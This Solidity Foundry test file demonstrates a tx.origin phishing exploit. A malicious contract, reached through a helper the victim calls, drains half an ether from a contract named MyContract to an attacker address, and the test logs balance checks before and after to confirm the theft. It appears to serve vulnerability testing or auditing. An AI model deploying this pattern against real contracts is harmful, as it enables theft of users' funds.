// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/mycontract.sol";

contract Malicious {
    MyContract public target;
    address public attacker;
    
    constructor(MyContract _target, address _attacker) {
        target = _target;
        attacker = _attacker;
    }

    function initiateAttack(uint amount) public {
        target.sendTo(attacker, amount);
    }
}

contract VictimHelper {
    Malicious public malicious;
    
    constructor(Malicious _malicious) {
        malicious = _malicious;
    }
    
    function attack(uint amount) public {
        malicious.initiateAttack(amount);
    }
}

contract MyContractTest is Test {
    MyContract public myContract;
    address public victim = address(0x1);
    address public attacker = address(0xbad);
    Malicious public malicious;
    VictimHelper public victimHelper;

    function setUp() public {
        // Deploy contract with victim as owner
        vm.startPrank(victim);
        myContract = new MyContract();
        vm.stopPrank();
        
        // Fund the contract with 1 ether
        vm.deal(address(myContract), 1 ether);
        
        // Deploy malicious contract
        malicious = new Malicious(myContract, attacker);
        
        // Deploy victim helper contract
        victimHelper = new VictimHelper(malicious);
    }

    function testTxOriginVulnerability() public {
        uint attackAmount = 0.5 ether;
        
        // Start Diff Check - State BEFORE attack
        console.log("--- BEFORE-Trigger Attack ---");
        uint contractBalanceBefore = address(myContract).balance;
        uint contractBalanceFuncBefore = myContract.getContractBalance();
        uint totalTransfersBefore = myContract.totalTransfers();
        uint recipientBalanceBefore = myContract.recipientBalances(attacker);
        uint attackerBalanceBefore = attacker.balance;
        
        console.log("Contract ETH Balance: %s", contractBalanceBefore);
        console.log("getContractBalance() return: %s", contractBalanceFuncBefore);
        console.log("Total Transfer Count: %s", totalTransfersBefore);
        console.log("Attacker's contract balance: %s", recipientBalanceBefore);
        console.log("Attacker external balance: %s", attackerBalanceBefore);
        
        // Record critical state
        uint[5] memory beforeState = [
            contractBalanceFuncBefore,
            totalTransfersBefore,
            recipientBalanceBefore,
            contractBalanceBefore,
            attackerBalanceBefore
        ];

        // Trigger attack
        console.log("--- Trigger Attack ---");
        // Simulate victim (EOA) calling helper contract
        // Set both msg.sender AND tx.origin to victim
        vm.prank(victim, victim);
        victimHelper.attack(attackAmount);
        console.log("Attack executed with amount:", attackAmount);

        // Start Diff Check - State AFTER attack
        console.log("--- AFTER-Trigger Attack ---");
        uint contractBalanceAfter = address(myContract).balance;
        uint contractBalanceFuncAfter = myContract.getContractBalance();
        uint totalTransfersAfter = myContract.totalTransfers();
        uint recipientBalanceAfter = myContract.recipientBalances(attacker);
        uint attackerBalanceAfter = attacker.balance;

        console.log("Contract ETH Balance: %s", contractBalanceAfter);
        console.log("getContractBalance() return: %s", contractBalanceFuncAfter);
        console.log("Total Transfer Count: %s", totalTransfersAfter);
        console.log("Attacker's contract balance: %s", recipientBalanceAfter);
        console.log("Attacker external balance: %s", attackerBalanceAfter);
        
        // Record post-attack state
        uint[5] memory afterState = [
            contractBalanceFuncAfter,
            totalTransfersAfter,
            recipientBalanceAfter,
            contractBalanceAfter,
            attackerBalanceAfter
        ];

        // Differential verification
        console.log("--- Verification ---");
        bool[] memory checks = new bool[](5);
        
        // Check 1: Contract balance reduction (via function)
        checks[0] = (contractBalanceFuncAfter == contractBalanceFuncBefore - attackAmount);
        console.log("Check: getContractBalance decrease matches attack amount? %s", 
                   checks[0] ? "PASS" : "FAIL");
        
        // Check 2: Total transfers incremented
        checks[1] = (totalTransfersAfter == totalTransfersBefore + 1);
        console.log("Check: totalTransfers increased by 1? %s", 
                   checks[1] ? "PASS" : "FAIL");
        
        // Check 3: Recipient balance increased
        checks[2] = (recipientBalanceAfter == recipientBalanceBefore + attackAmount);
        console.log("Check: Attacker's recipient balance increase? %s", 
                   checks[2] ? "PASS" : "FAIL");
        
        // Check 4: Actual ETH balance decrease
        checks[3] = (contractBalanceAfter == contractBalanceBefore - attackAmount);
        console.log("Check: contract ETH balance decrease? %s", 
                   checks[3] ? "PASS" : "FAIL");
        
        // Check 5: Attacker ETH increase
        checks[4] = (attackerBalanceAfter == attackerBalanceBefore + attackAmount);
        console.log("Check: attacker ETH increased? %s", 
                   checks[4] ? "PASS" : "FAIL");

        // Vulnerability assessment
        bool allChecksPassed = true;
        for (uint i = 0; i < 5; i++) {
            if (!checks[i]) {
                allChecksPassed = false;
            }
        }

        // Final verdict
        if (allChecksPassed) {
            console.log("Vulnerability Exists: All state changes confirm successful exploitation");
        } else {
            console.log("Vulnerability not Exist: State changes don't match exploit predictions");
        }
    }
}